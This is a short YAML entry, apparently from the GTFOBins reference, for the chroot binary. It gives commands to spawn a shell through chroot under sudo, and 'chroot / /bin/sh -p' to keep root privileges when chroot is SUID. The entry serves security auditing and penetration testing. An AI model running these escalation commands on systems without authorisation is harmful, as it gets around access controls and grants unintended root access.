<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/chroot -->
---
functions:
  shell:
  - code: |-
      chroot /
    contexts:
      sudo:
      suid:
        code: |-
          chroot / /bin/sh -p
        shell: false
...
